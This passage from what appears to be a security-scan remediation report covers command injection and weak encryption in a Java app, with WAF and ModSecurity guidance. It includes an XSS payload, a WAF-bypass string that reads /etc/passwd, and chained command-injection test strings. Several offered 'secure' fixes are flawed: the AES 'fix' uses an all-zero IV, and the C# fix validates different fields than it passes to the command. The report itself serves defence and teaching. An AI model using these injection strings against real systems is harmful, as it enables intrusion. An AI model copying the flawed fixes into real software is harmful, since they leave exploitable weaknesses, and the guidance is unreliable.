[tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;] [hostname &quot;localhost&quot;]\n\n[client ::1] ModSecurity: Warning. Pattern match &quot;(?i)&lt;script[^&gt;]*&gt;[\\\\\\\\s\\\\\\\\S]*?&quot; at ARGS:arg. [file &quot;C:/Apache24/modules/mod_security2/activated_rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;90&quot;] [id &quot;941110&quot;] [msg &quot;XSS Filter - Category 1: Script Tag Vector&quot;] [data &quot;Matched Data: &lt;script&gt; found within ARGS:arg: &lt;script&gt;alert('XSS attack!')&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]", "comments": "WAF cannot be the only protection to prevent SQLi Attacks, and input validation procedures must be added to the code when possible. Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/\n\nIt is recommended to fix all XSS types of vulnerabilities in the code (e.g.,input sanitization and validation) and add WAF, CSP and X-XSS-Protection as a temporary mitigation, mechanisms to improve attack detection and extra protection layer to the web server. \nIn addition to WAF protection, DOM XSS attack can be prevented by using right output method at client side.\n\nWhen using WAF, CSP  and XSS-Protections as a temporary fix while the application is being fixed or to avoid some known/automated XSS attacks, the application team has to keep in mind that new attack vectors are constantly being created to try to bypass some of those controls. References on XSS attack vectors that may bypass the CSP/XSS/WAF rules: &lt;a href=&quot;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&quot; target=_blank&gt; https://portswigger.net/web-security/cross-site-scripting/cheat-sheet &lt;/a&gt;\n\nWAF can be used to log attempts and perform active defenses to block an on-going attack (e.g. block the attacker IP on the firewall).\n\nWAF cannot be the only protection to prevent XSS Attacks, and input validation procedures must be added to the code when possible.\n\nNote: Perform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;  &gt;  '   &quot; , ; & $  etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\nNote2: Remember there are methods to bypass WAF protections against SQLi (https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF), but it can be used to log attempts and perform active defenses to block an attacker (e.g. block the attacker IP on the firewall). \nNote3: CSP and X-XSS-Protection is a directive executed in the browser level, and the WAF protections are on the web server level. So logs generated by CSP/X-XSS-Protections are created on the user browser console and can not be imported by the SIEM tools. Logs generated by WAF can be imported by SIEM tools.\n\n\nPerform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;, &gt;, ', &quot;, etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\n\nRemember there are methods to bypass WAF protections against SQLi (https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF), but it can be used to log attempts and perform active defenses to block an attacker (e.g. block the attacker IP on the firewall)."}, {"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for remote code execution attack (must be present in the rules folder)\n- REQUEST-932-APPLICATION-ATTACK-RCE.conf\n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from eventviewer. Below is the log captured for SQL Injection.\n\n(To be checked on EventLog: [client ] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-.....conf&quot;] [line &quot;57&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;ALCB-749326Z-LX&quot;] [uri &quot;/Home/Login&quot;] [unique_id &quot;18014398524514369608&quot;]\n\n\nLinux:", "comments": "Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\n\nPerform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;  &gt;  '   &quot; , ; & $  etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\n\nRemember there are methods to bypass WAF protections against RCE (https://www.secjuice.com/web-application-firewall-waf-evasion/):\n10.10.10.1; cat$u+/etc$u/passwd$u -&gt; as $u is not initialized, it may bypass the WAF ruleset and have access to the file. \n\nWAF can be used to log attempts and perform active defenses to block an on-going attack (e.g. block the attacker IP on the firewall).\n\nWAF cannot be the only protection to prevent RCE Attacks, and input validation procedures must be added to the code when possible.\n\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/"}]}}}}}, "unsupported": {"Command Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00358", "function": "java.lang.Runtime.exec()", "line": "719", "snippet": "String commandArray[] = { \"cmd.exe\", \"/c\", cmd, filePath};\n\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00361", "function": "java.lang.Runtime.exec()", "line": "792", "snippet": "String filePath= prop.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\";\n\t\t\t\tString commandArray[] = { \"cmd\", \"/c\", cmd, filePath};\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00359", "function": "java.lang.Runtime.exec()", "line": "719", "snippet": "String commandArray[] = { \"cmd.exe\", \"/c\", cmd, filePath};\n\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00360", "function": "java.lang.Runtime.exec()", "line": "792", "snippet": "String filePath= prop.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\";\n\t\t\t\tString commandArray[] = { \"cmd\", \"/c\", cmd, filePath};\n\t\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\t\tprocess.waitFor();\n\t\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));"}]}], "remediation": {"remediation": {"@id": "R.0003", "@name": "Command Injection", "@dateLastModified": "7/23/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "protected void btnCheck_Click(object sender, EventArgs e)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    ProcessStartInfo startInfo = new ProcessStartInfo();\n                    startInfo.FileName = &quot;cmd.exe&quot;;\n\n                    startInfo.Arguments = &quot;/c ping &quot; +<em class=\"red\"> txtIP.Text.ToString();</em>\n                    startInfo.RedirectStandardOutput = true;\n                    startInfo.UseShellExecute = false;\n\n                    process.StartInfo = startInfo;\n                    process.Start();\n                    while (!process.HasExited)\n                    {\n                        Response.Write(process.StandardOutput.ReadToEnd());\n                    }   \n                }\n                    catch (InvalidOperationException inOEx)\n                {\n                    lblError.Text = inOEx.Message.ToString();\n                }\n                catch (Exception ex)\n                {\n                    lblError.Text = ex.Message.ToString();\n                }\n            }\n        }", "nonvulncode": "protected void btnCheck_Click(object sender, EventArgs e)\n        {\n             try\n            {\n              <em class=\"blue\">  Ping pingSender = new Ping();</em>\n\n                int timeout = 120;\n            <em class=\"blue\">    PingReply reply = pingSender.Send(txtIP.Text.ToString(), timeout);</em>\n                if (reply.Status == IPStatus.Success)\n                {\n                    Response.Write(&quot;Address: &quot; + reply.Address.ToString());\n                    Response.Write(&quot;RoundTrip time: &quot; + reply.Address.ToString());\n                }\n                else\n                {\n                    Response.Write(&quot;Invalid IP Address&quot;);\n                }\n            }\n            catch (PingException pngEx)\n            {\n                lblError.Text = &quot;Invalid IP Address. &quot; + pngEx.Message.ToString();\n            }\n            catch (Exception ex)\n            {\n                lblError.Text = &quot;Invalid IP Address. &quot; + ex.Message.ToString();\n            }\n        }", "comments": "Use existing APIs instead of scaping to a shell command. For example, use the native  <em class=\"blue\">System.Net.NetworkInformation.Ping for .Net, rather than calling the DOS command cmd.exe to perform the 'ping' command.\n</em>", "impact": "For common functionalities (e.g. ping, traceroute, open file, etc.) it's easy to find libraries that performs those that are well tested and widely used in the market. But for some uncommon functionalities, this may not be existent, or not tested enough to trust the library or method. DO NOT import or use libraries that you do not know the origin as those may contain security vulnerabilities or even Easter eggs implanted by the developers.. \nConfirm with the application owner, the license to use any library that is not part of the core system you are using, even the open source ones, to make sure there is no restriction of use or limitations from the same (e.g. make reference to the developer; &quot;copy left&quot;: any code using the open source library has to become open source as well)", "abstract": "Use of native libraries"}, {"@type": ".NET/C#/ASP", "vulncode": "protected void btnCheck_Click(object sender, EventArgs e)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    ProcessStartInfo startInfo = new ProcessStartInfo();\n                    startInfo.FileName = &quot;<em class=\"red\">runManualBalance.bat</em> &quot;;\n\n                    startInfo.Arguments = <em class=\"red\">&quot;--id=&quot; + userID.Text.ToString() + &quot;  --date=&quot; + date.Text.ToString() + &quot;  --user_IP=&quot; + IP.Text.ToString() ;</em>\n                    startInfo.RedirectStandardOutput = true;\n                    startInfo.UseShellExecute = false;\n\n                    process.StartInfo = startInfo;\n                    process.Start();\n                    while (!process.HasExited)\n                    {\n                        Response.Write(process.StandardOutput.ReadToEnd());\n                    }   \n                }\n                    catch (InvalidOperationException inOEx)\n                {\n                    lblError.Text = inOEx.Message.ToString();\n                }\n                catch (Exception ex)\n                {\n                    lblError.Text = ex.Message.ToString();\n                }\n            }\n        }", "nonvulncode": "protected void btnCheck_Click(object sender, EventArgs e)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    //Match pattern for IP address    \n<em class=\"blue\">                    string userID_Pattern = @&quot;^([1-9]){6}$&quot;;  // ID: 123456\n                    string date_Pattern = @&quot;^([0-1][0-9][0-3][0-9]20[2-5][0-9])$ &quot;;  // Date(MMDDYYYY): 05302020\n                    string userIP_Pattern = @&quot;^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$&quot;; // IP: 192.168.0.2</em>\n                    //Regular Expression object    \n                    Regex checkID = new Regex(userID_Pattern);\n                    Regex checkDate = new Regex(date_Pattern);\n                    Regex checkIP = new Regex(userIP_Pattern);\n                  <em class=\"blue\">  if (    (txtID.Text.ToString() != &quot;&quot; && checkID.IsMatch(txtID.Text.ToString() )) && (txtDate.Text.ToString() != &quot;&quot; && checkDate.IsMatch(txtDate.Text.ToString() )) && (txtIP.Text.ToString() != &quot;&quot; && checkIP.IsMatch(txtIP.Text.ToString() ))  )</em>\n                    {\n                        ProcessStartInfo startInfo = new ProcessStartInfo();\n                        startInfo.FileName = &quot;runManualBalance.bat&quot;;\n<em class=\"blue\">                        startInfo.Arguments = &quot;--id=&quot; + userID.Text.ToString() + &quot;  --date=&quot; + date.Text.ToString() + &quot;  --user_IP=&quot; + IP.Text.ToString() ;  // Whitelisted values prevent command injection FIX\n</em>                         startInfo.RedirectStandardOutput = true;\n                        startInfo.UseShellExecute = false;\n\n                        process.StartInfo = startInfo;\n                        process.Start();\n                        while (!process.HasExited)\n                        {\n                            Response.Write(process.StandardOutput.ReadToEnd());\n                        }\n                    }\n                    else\n                    {\n                        lblError.Text = &quot;Invalid IP Address&quot;;\n                    }\n                }\n                catch (InvalidOperationException inOEx)\n                {\n                    lblError.Text = inOEx.Message.ToString();\n                }\n                catch (Exception ex)\n                {\n                    lblError.Text = ex.Message.ToString();\n                }\n            }\n        }", "comments": "With our example code, user needs to input the IP to  check if the IP is available. The code using ping command and concatenated the input of the user. With the vulnerable code, user can concatenate other command because they did not put any validation to it. Without knowing that this is vulnerable to command injection. Below is just one example command that can lead to information leak.\n\nrunManualBalance.bat 123456 052020 10.2.3.0<em class=\"red\"> && dir</em>\n\nIn our non-vulnerable code, we put some validation using regular expression just to allow only valid IPs. With this, user cannot anymore inject any other sets of command to exploit the application.\n\nWhitelist with a specific set of allowed characters is the best way of solving input validation for command injection.", "impact": "There are ways for an attacker to cause DoS by overloading the application when exploiting the Regexp performance (e.g., sending multiple long filenames to be checked will use too many computational cycles on the server testing the Regexp). If you are concerned with a DoS on the application due to multiple Regexp checks, implement a CAPTCHA validation after a certain number of tries on the web page.\nRemember to only allow a certain set of characters to be recognized (whitelist), instead of removing chars you think should not be used (blacklist). Blacklists approach is usually incomplete and can pose a security issue.", "abstract": "Implement functionality in code"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView executeCommand( @RequestParam(value=&quot;cmd&quot;)String cmd) {\n\t\tModelAndView mv = new ModelAndView();\n\t\tList&lt;String&gt; dirList = new ArrayList&lt;String&gt;();\n\t<em class=\"red\">//input argument added to command array without sanitization</em>\t\n\t\tString commandArray[] = {&quot;cmd&quot;, &quot;/c&quot;, cmd, &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles&quot;};\n\t\ttry {\n\t\t\tProcess process = Runtime.getRuntime().exec(commandArray);\n\t\t\tprocess.waitFor();\n\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t        String line;\n\t        while (true) {\n\t            line = r.readLine();\n\t            if (line == null) { break; }\n\t            dirList.add(line);\n\t        }\n\t        r.close();\n\t        mv.setViewName(&quot;commandExec&quot;);\n\t        mv.addObject(&quot;dirlist&quot;, dirList);\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InterruptedException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t} \n\t\treturn mv;\n\t}", "nonvulncode": "public ModelAndView executeCommand( @RequestParam(value=&quot;cmd&quot;)String cmd) {\n\t\tModelAndView mv = new ModelAndView();\n\t\tList&lt;String&gt; dirList = new ArrayList&lt;String&gt;();\n\t\t<em class=\"blue\">boolean isCmdValid = Pattern.matches(&quot;^[a-zA-Z0-9. /:]{2,25}$&quot;, cmd);\nList&lt;String&gt; whiteListCmd = Arrays.asList(&quot;cd&quot;,&quot;dir&quot;,&quot;type&quot;); \n\t\tString[] inputCmd = cmd.split(&quot; &quot;);\n\t\t\n\t\tisCmdValid = isCmdValid && whiteListCmd.stream().anyMatch(wlcmd -&gt; wlcmd.matches(inputCmd[0]));\n\t\tif(isCmdValid) {\n\t\tString commandArray[] = {&quot;cmd&quot;, &quot;/c&quot;, cmd, &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles&quot;};\n\t\ttry </em>{\n\t\t\t<em class=\"blue\">Process process = Runtime.getRuntime().exec(commandArray);</em>\n\t\t\tprocess.waitFor();\n\t\t\tBufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));\n\t        String line;\n\t        while (true) {\n\t            line = r.readLine();\n\t            if (line == null) { break; }\n\t            dirList.add(line);\n\t        }\n\t        r.close();\n\t        mv.setViewName(&quot;commandExec&quot;);\n\t        mv.addObject(&quot;dirlist&quot;, dirList);\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (InterruptedException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t} <em class=\"blue\">else {\n\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Command execution not carried out, since it has invalid characters&quot;);\n\t\t}</em>\n\t\treturn mv;\n\t}", "comments": "This protection strategy is based on some layers of protections, based on the required functionalities. The best approach will always to avoid executing OS commands from the code, making it easier to port to other OS if needed. Input string is sanitized, whitelisted and only if validated is executed.\n\nThe first layer is to find only whitelisted characters on the cmd string (e.g.: letters, numbers, space, dot and /). This removes some attack strategies such as using &gt; to write to local files (overwrite log file, or generate new executable commands).\nThe second layer is to check if the command (first parameter) is inside the list of all business required commands (&quot;cd&quot;, &quot;dir&quot;, &quot;type&quot;). Of course this list needs to be adapted to each code.\nThe last layer in use is to run the command using &quot;Runtime.exec()&quot;, that splits the string into an array of words, then executes the first word in the array with the rest of the words as parameters. So any invalid characters (&, &&, |, ||, etc) would simply end up as a parameter being passed to the first command. \n\nFor more information, refer to: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html", "impact": "This is a guidance for one strategy to fix only, as for different commands, the argument validation and sanitization may differ. In any case, the concatenation of commands must be prevented on the code.\nOther strategies besides sanitizing and validating the input include: using the functionality via library instead of calling a cmd function; or limiting the commands and arguments to an internal list, where the parameters select one element on the pre-defined list of arguments.", "abstract": "Using RegExp and Runtime.exec"}]}, "mitigations": {"mitigation": [{"system": "Generic WAF", "configuration": "Varies from the Web Application Firewall (WAF) in use.", "backend": "WAF and Firewalls default ruleset (e.g., OWASP Core Rule Set/CRS)", "frontend": "see backend code section", "comments": "Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\n\nThe default rules for WAF protect against SOME command injections and can be an extra layer of protection. \n\nUnfortunately, WAF rules can be bypassed in many scenarios and cannot be the only form of protection in place. \n\nWhen testing WAF rules, test some basic bypass on it (e.g., use && or | or ; to pipe the commands to execute) \n     127.0.0.1 && cd /root/Desktop && pwd && service --status-all\n     127.0.0.1  && cat index.php\n     127.0.0.1 && netstat -ltnp | grep '80'\n\nPerform a full functional test if WAF is added. Include on the test scripts special characters scenarios that are expected to work on the application (e.g., Spanish, Russian, etc. charsets, &lt;, &gt;, ', &quot;, etc). \nWAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\n\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/"}, {"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for remote code execution attack (must be present in the rules folder)\n- REQUEST-932-APPLICATION-ATTACK-RCE.conf\n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from eventviewer. Below is the log captured for SQL Injection.\n\n(To be checked on EventLog: [client ] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-.....conf&quot;] [line &quot;57&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;ALCB-749326Z-LX&quot;] [uri &quot;/Home/Login&quot;] [unique_id &quot;18014398524514369608&quot;]\n\n\nLinux:", "comments": "Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\n\nPerform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;  &gt;  '   &quot; , ; & $  etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\n\nRemember there are methods to bypass WAF protections against RCE (https://www.secjuice.com/web-application-firewall-waf-evasion/):\n10.10.10.1; cat$u+/etc$u/passwd$u -&gt; as $u is not initialized, it may bypass the WAF ruleset and have access to the file. \n\nWAF can be used to log attempts and perform active defenses to block an on-going attack (e.g. block the attacker IP on the firewall).\n\nWAF cannot be the only protection to prevent RCE Attacks, and input validation procedures must be added to the code when possible.\n\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/"}]}}}}, "Weak Encryption: Insecure Mode of Operation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00387", "function": "getInstance()", "line": "428", "snippet": "SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"PBEWithMD5AndDES\");\n\t\t\n\t\t\tCipher cipherDec = Cipher.getInstance(\"PBEWithMD5AndDES\");\n\t\t\tPBEKeySpec pbe = new PBEKeySpec(passphrase);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00388", "function": "getInstance()", "line": "395", "snippet": "key = KeyGenerator.getInstance(\"AES\").generateKey();\n\t\t \n            ecipher = Cipher.getInstance(\"AES\");            \n            ecipher.init(Cipher.ENCRYPT_MODE, key1, new IvParameterSpec(new byte[16]));        \n            byte[] enc = ecipher.doFinal(password.getBytes());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00389", "function": "getInstance()", "line": "462", "snippet": "byte[] keyBytes = encryptionKey.getBytes();\n\t\t\tSecretKeySpec key = new SecretKeySpec(keyBytes, \"AES\");\n\t\t\tCipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(Cipher.ENCRYPT_MODE, key);\n            encrypted= Base64.getEncoder().encodeToString(cipher.doFinal(password.getBytes(\"UTF-8\")));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00386", "function": "getInstance()", "line": "532", "snippet": "//Cipher cipher = Cipher.getInstance(\"RSA/NONE/OAEPWithSHA1AndMGF1Padding\");\n\t\t\tCipher cipher = Cipher.getInstance(\"RSA\");\n\t\t\t// Initialize Cipher for ENCRYPT_MODE\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);"}]}], "remediation": {"remediation": {"@id": "R.0125", "@name": "Weak Encryption: Insecure Mode of Operation", "@dateLastModified": "8/7/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "static string EncryptStringToBytes_Aes(string encryptString,string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(encryptionKey, salt);\n                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);\n                aesAlg.IV = key.GetBytes(aesAlg.BlockSize / 8);\n                \n                aesAlg.Mode =<em class=\"red\"> CipherMode.ECB;</em>\n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "nonvulncode": "static string EncryptStringToBytes_Aes(string encryptString,string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(encryptionKey, salt);\n                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);\n                aesAlg.IV = key.GetBytes(aesAlg.BlockSize / 8);\n                \n                aesAlg.Mode = <em class=\"blue\">CipherMode.CBC;</em>\n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "comments": "Don't set ECB as Cipher Mode in the encryption because this is inherently weak, the advisable CipherMode is CBC. The current default Cipher Mode of Aes and TripleDES is CBC.\n\nSet all security values to be explicit. It is not a good practice to leave the encryption mode implicit as the default value, (e.g.: for .Net, CBC is set as default currently, but it may change in the future).\nAs the code is using CBC to perform encryptions, the database will contain values created using CBC, and if the default in the future is another mode XYZ, the code will not be able to decrypt by using XYZ mode.\nIt is good practice to set all parameters that you want to be used explicitly on the code to avoid this future problems.", "impact": "None", "abstract": "Use of CBC mode"}, {"@type": "JAVA/JSP", "vulncode": "private String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n          <em class=\"red\">  ecipher = Cipher.getInstance(&quot;AES&quot;);\n</em>\t\t\t// initialize the ciphers with the given key\n            \n            ecipher.init(Cipher.ENCRYPT_MODE, key);\n            // encode the string into a sequence of bytes using the named charset            \n            // storing the result into a new byte array. \n         \n            byte[] utf8 = password.getBytes(&quot;UTF8&quot;);\n            byte[] enc = ecipher.doFinal(utf8);\n         \n            // encode to base64\t         \n            enc = BASE64EncoderStream.encode(enc);\n            encrypted = new String(enc);\n\t\t\t\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (UnsupportedEncodingException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t}\n\t\t\n\t\treturn encrypted;\n\t}\t\npublic ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tif(userProfile.getUserName()!=null) {\n\t\t\t// generate secret key using DES algorithm\n\t\t\tString encrypted = encryptAES(userProfile.getPwd());\n\t        userProfile.setEncryptionKey(encrypted);\n\t        userProfile = dao.addUserProfile(userProfile);\t\t\t\t\t\t\t\t\t\t\n\t\t\t\n            UserProfileForm user = new UserProfileForm();\n\t\t\tuser.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUserProfile&quot;,&quot;userProfile&quot;,user);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUserProfile&quot;,&quot;userProfile&quot;,new UserProfileForm());\n\t\t}\n\t}", "nonvulncode": "private String encryptAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n\t\t\t//&quot;AES/CBC/PKCS5PADDING&quot; mode to be used to avoid insecure mode of operation\n            <em class=\"blue\">ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);\n</em>\t\t\t// initialize the ciphers with the given key\n            \n            ecipher.init(Cipher.ENCRYPT_MODE, key,<em class=\"blue\"> new IvParameterSpec(new byte[16])</em>);\n            // encode the string into a sequence of bytes using the named charset            \n            // storing the result into a new byte array. \n         \n            byte[] utf8 = password.getBytes(&quot;UTF8&quot;);\n            byte[] enc = ecipher.doFinal(utf8);\n         \n            // encode to base64\t         \n            enc = BASE64EncoderStream.encode(enc);\n            encrypted = new String(enc);\n\t\t\t\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (UnsupportedEncodingException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t} catch (NoSuchPaddingException e) 